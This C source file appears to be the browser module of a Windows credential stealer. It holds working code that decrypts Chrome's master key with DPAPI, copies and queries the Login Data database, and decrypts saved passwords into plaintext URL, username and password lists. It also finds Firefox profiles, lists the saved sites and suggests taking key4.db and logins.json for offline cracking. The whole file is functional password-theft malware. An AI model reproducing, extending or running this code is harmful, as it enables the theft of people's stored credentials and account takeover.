#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <dpapi.h>
#include <bcrypt.h>
#include "../include/browser.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

#define BROWSER_BUFFER_SIZE 65536
#define MAX_CREDENTIALS 500

// SQLite3 minimal interface (we'll use sqlite3.c amalgamation)
#ifdef USE_SQLITE
#include "sqlite3.h"
#endif

// Base64 decoding table
static const unsigned char base64_decode_table[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

static int base64_decode(const char *input, unsigned char *output, int *out_len)
{
    int len = strlen(input);
    int i, j;
    unsigned char a, b, c, d;

    *out_len = 0;

    for (i = 0, j = 0; i < len; i += 4)
    {
        a = base64_decode_table[(unsigned char)input[i]];
        b = base64_decode_table[(unsigned char)input[i + 1]];
        c = base64_decode_table[(unsigned char)input[i + 2]];
        d = base64_decode_table[(unsigned char)input[i + 3]];

        if (a == 64 || b == 64)
            break;

        output[j++] = (a << 2) | (b >> 4);
        if (c != 64)
        {
            output[j++] = (b << 4) | (c >> 2);
            if (d != 64)
            {
                output[j++] = (c << 6) | d;
            }
        }
    }

    *out_len = j;
    return 0;
}

// Extract encrypted_key from Chrome's Local State JSON
static unsigned char* get_chrome_master_key(int *key_len)
{
    char local_state_path[MAX_PATH];
    char *local_appdata = getenv("LOCALAPPDATA");

    if (local_appdata == NULL)
    {
        return NULL;
    }

    sprintf(local_state_path, "%s\\Google\\Chrome\\User Data\\Local State", local_appdata);

    // Read Local State file
    FILE *fp = fopen(local_state_path, "rb");
    if (fp == NULL)
    {
        return NULL;
    }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char *json_content = (char*)malloc(file_size + 1);
    if (json_content == NULL)
    {
        fclose(fp);
        return NULL;
    }

    fread(json_content, 1, file_size, fp);
    json_content[file_size] = '\0';
    fclose(fp);

    // Find "encrypted_key" in JSON (simple parsing)
    char *key_start = strstr(json_content, "\"encrypted_key\"");
    if (key_start == NULL)
    {
        free(json_content);
        return NULL;
    }

    // Find the value (after the colon and opening quote)
    key_start = strchr(key_start, ':');
    if (key_start == NULL)
    {
        free(json_content);
        return NULL;
    }

    key_start = strchr(key_start, '"');
    if (key_start == NULL)
    {
        free(json_content);
        return NULL;
    }
    key_start++; // Skip opening quote

    // Find end of value
    char *key_end = strchr(key_start, '"');
    if (key_end == NULL)
    {
        free(json_content);
        return NULL;
    }

    // Extract base64 encoded key
    int b64_len = key_end - key_start;
    char *b64_key = (char*)malloc(b64_len + 1);
    strncpy(b64_key, key_start, b64_len);
    b64_key[b64_len] = '\0';

    free(json_content);

    // Decode base64
    unsigned char *decoded = (unsigned char*)malloc(b64_len);
    int decoded_len;
    base64_decode(b64_key, decoded, &decoded_len);
    free(b64_key);

    // Skip "DPAPI" prefix (5 bytes)
    if (decoded_len < 5 || memcmp(decoded, "DPAPI", 5) != 0)
    {
        free(decoded);
        return NULL;
    }

    // Decrypt with DPAPI
    DATA_BLOB encrypted_blob;
    encrypted_blob.pbData = decoded + 5;
    encrypted_blob.cbData = decoded_len - 5;

    DATA_BLOB decrypted_blob;
    if (!CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob))
    {
        free(decoded);
        return NULL;
    }

    free(decoded);

    // Return master key
    unsigned char *master_key = (unsigned char*)malloc(decrypted_blob.cbData);
    memcpy(master_key, decrypted_blob.pbData, decrypted_blob.cbData);
    *key_len = decrypted_blob.cbData;

    LocalFree(decrypted_blob.pbData);

    return master_key;
}

// Decrypt Chrome password using AES-GCM
static char* decrypt_chrome_password(unsigned char *encrypted, int enc_len, unsigned char *key, int key_len)
{
    if (enc_len < 15) // v10/v11 prefix (3) + nonce (12) + at least some data
    {
        return NULL;
    }

    // Check for v10 or v11 prefix
    if (memcmp(encrypted, "v10", 3) != 0 && memcmp(encrypted, "v11", 3) != 0)
    {
        // Try DPAPI decryption for older Chrome versions
        DATA_BLOB encrypted_blob;
        encrypted_blob.pbData = encrypted;
        encrypted_blob.cbData = enc_len;

        DATA_BLOB decrypted_blob;
        if (CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob))
        {
            char *result = (char*)malloc(decrypted_blob.cbData + 1);
            memcpy(result, decrypted_blob.pbData, decrypted_blob.cbData);
            result[decrypted_blob.cbData] = '\0';
            LocalFree(decrypted_blob.pbData);
            return result;
        }
        return NULL;
    }

    // AES-GCM decryption for v10/v11
    unsigned char *nonce = encrypted + 3;  // 12 bytes nonce
    unsigned char *ciphertext = encrypted + 15;  // After prefix + nonce
    int ciphertext_len = enc_len - 15 - 16;  // Subtract auth tag (16 bytes)

    if (ciphertext_len <= 0)
    {
        return NULL;
    }

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open AES algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        return NULL;
    }

    // Set GCM mode
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                               (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status))
    {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // Generate key
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, key_len, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    // Prepare authenticated cipher info
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = encrypted + enc_len - 16;  // Auth tag at end
    authInfo.cbTag = 16;

    // Allocate output buffer
    unsigned char *plaintext = (unsigned char*)malloc(ciphertext_len + 1);
    ULONG plaintext_len = 0;

    // Decrypt
    status = BCryptDecrypt(hKey, ciphertext, ciphertext_len, &authInfo,
                           NULL, 0, plaintext, ciphertext_len, &plaintext_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status))
    {
        free(plaintext);
        return NULL;
    }

    plaintext[plaintext_len] = '\0';
    return (char*)plaintext;
}

char* extract_chrome_credentials(void)
{
    char *result = (char*)malloc(BROWSER_BUFFER_SIZE);
    if (result == NULL)
    {
        return NULL;
    }
    memset(result, 0, BROWSER_BUFFER_SIZE);

    strcpy(result, "=== CHROME CREDENTIALS ===\n\n");

#ifdef USE_SQLITE
    // Get master key
    int key_len;
    unsigned char *master_key = get_chrome_master_key(&key_len);
    if (master_key == NULL)
    {
        strcat(result, "[-] Failed to get Chrome master key\n");
        strcat(result, "    (Chrome may not be installed or no saved passwords)\n");
        return result;
    }

    // Copy Login Data to temp location (Chrome locks it when running)
    char login_data_path[MAX_PATH];
    char temp_db_path[MAX_PATH];
    char *local_appdata = getenv("LOCALAPPDATA");
    char *temp = getenv("TEMP");

    sprintf(login_data_path, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", local_appdata);
    sprintf(temp_db_path, "%s\\chrome_login_data_copy.db", temp);

    if (!CopyFileA(login_data_path, temp_db_path, FALSE))
    {
        strcat(result, "[-] Failed to copy Login Data database\n");
        strcat(result, "    (Chrome might be running - close it first)\n");
        free(master_key);
        return result;
    }

    // Open SQLite database
    sqlite3 *db;
    if (sqlite3_open(temp_db_path, &db) != SQLITE_OK)
    {
        strcat(result, "[-] Failed to open Login Data database\n");
        free(master_key);
        DeleteFileA(temp_db_path);
        return result;
    }

    // Query logins
    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt *stmt;

    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK)
    {
        strcat(result, "[-] Failed to query database\n");
        sqlite3_close(db);
        free(master_key);
        DeleteFileA(temp_db_path);
        return result;
    }

    int count = 0;
    char line[1024];

    while (sqlite3_step(stmt) == SQLITE_ROW && count < MAX_CREDENTIALS)
    {
        const char *url = (const char*)sqlite3_column_text(stmt, 0);
        const char *username = (const char*)sqlite3_column_text(stmt, 1);
        const unsigned char *password_blob = sqlite3_column_blob(stmt, 2);
        int password_len = sqlite3_column_bytes(stmt, 2);

        if (url && username && password_blob && password_len > 0)
        {
            char *password = decrypt_chrome_password((unsigned char*)password_blob,
                                                      password_len, master_key, key_len);

            sprintf(line, "URL: %s\nUsername: %s\nPassword: %s\n\n",
                    url,
                    username,
                    password ? password : "(decryption failed)");

            if (strlen(result) + strlen(line) < BROWSER_BUFFER_SIZE - 100)
            {
                strcat(result, line);
                count++;
            }

            if (password)
            {
                free(password);
            }
        }
    }

    if (count == 0)
    {
        strcat(result, "[*] No saved credentials found\n");
    }
    else
    {
        sprintf(line, "\n[+] Total: %d credentials extracted\n", count);
        strcat(result, line);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(temp_db_path);
    free(master_key);
#else
    strcat(result, "[-] SQLite support not compiled in\n");
    strcat(result, "    Compile with -DUSE_SQLITE and link sqlite3.c\n");
#endif

    return result;
}

char* extract_firefox_credentials(void)
{
    char *result = (char*)malloc(BROWSER_BUFFER_SIZE);
    if (result == NULL)
    {
        return NULL;
    }
    memset(result, 0, BROWSER_BUFFER_SIZE);

    strcpy(result, "=== FIREFOX CREDENTIALS ===\n\n");

    // Find Firefox profile
    char profiles_path[MAX_PATH];
    char *appdata = getenv("APPDATA");

    if (appdata == NULL)
    {
        strcat(result, "[-] Could not find APPDATA directory\n");
        return result;
    }

    sprintf(profiles_path, "%s\\Mozilla\\Firefox\\Profiles", appdata);

    // Find profile directory (*.default* or *.default-release)
    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    sprintf(search_path, "%s\\*.default*", profiles_path);

    HANDLE hFind = FindFirstFileA(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        strcat(result, "[-] No Firefox profile found\n");
        return result;
    }

    char profile_path[MAX_PATH];
    sprintf(profile_path, "%s\\%s", profiles_path, find_data.cFileName);
    FindClose(hFind);

    // Read logins.json
    char logins_path[MAX_PATH];
    sprintf(logins_path, "%s\\logins.json", profile_path);

    FILE *fp = fopen(logins_path, "rb");
    if (fp == NULL)
    {
        strcat(result, "[-] Could not open logins.json\n");
        strcat(result, "    (Firefox may not have saved passwords)\n");
        return result;
    }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char *json_content = (char*)malloc(file_size + 1);
    fread(json_content, 1, file_size, fp);
    json_content[file_size] = '\0';
    fclose(fp);

    // Note: Firefox credentials are encrypted with NSS (Network Security Services)
    // Full decryption requires loading NSS DLLs or using key4.db + 3DES
    // This is complex and requires additional implementation

    strcat(result, "[*] Firefox profile found at:\n    ");
    strcat(result, profile_path);
    strcat(result, "\n\n");

    // Count logins (simple JSON parsing)
    int login_count = 0;
    char *ptr = json_content;
    while ((ptr = strstr(ptr, "\"hostname\"")) != NULL)
    {
        login_count++;
        ptr++;
    }

    char line[256];
    sprintf(line, "[*] Found %d encrypted login entries\n", login_count);
    strcat(result, line);

    strcat(result, "\n[-] Firefox decryption requires NSS libraries\n");
    strcat(result, "    Run the following to extract in plaintext:\n");
    strcat(result, "    > firefox_decrypt.py (Python tool)\n");
    strcat(result, "    Or copy key4.db + logins.json for offline analysis\n\n");

    // List the encrypted entries (hostnames only)
    strcat(result, "Saved sites:\n");
    ptr = json_content;
    int shown = 0;
    while ((ptr = strstr(ptr, "\"hostname\":\"")) != NULL && shown < 20)
    {
        ptr += 12;  // Skip "hostname":"
        char *end = strchr(ptr, '"');
        if (end)
        {
            int len = end - ptr;
            if (len < 200)
            {
                char hostname[256];
                strncpy(hostname, ptr, len);
                hostname[len] = '\0';
                sprintf(line, "  - %s\n", hostname);
                strcat(result, line);
                shown++;
            }
        }
    }

    if (login_count > 20)
    {
        sprintf(line, "  ... and %d more\n", login_count - 20);
        strcat(result, line);
    }

    free(json_content);
    return result;
}

char* extract_all_credentials(void)
{
    char *result = (char*)malloc(BROWSER_BUFFER_SIZE * 2);
    if (result == NULL)
    {
        return NULL;
    }
    memset(result, 0, BROWSER_BUFFER_SIZE * 2);

    // Chrome credentials
    char *chrome_creds = extract_chrome_credentials();
    if (chrome_creds)
    {
        strcat(result, chrome_creds);
        strcat(result, "\n");
        free(chrome_creds);
    }

    // Firefox credentials
    char *firefox_creds = extract_firefox_credentials();
    if (firefox_creds)
    {
        strcat(result, firefox_creds);
        free(firefox_creds);
    }

    return result;
}
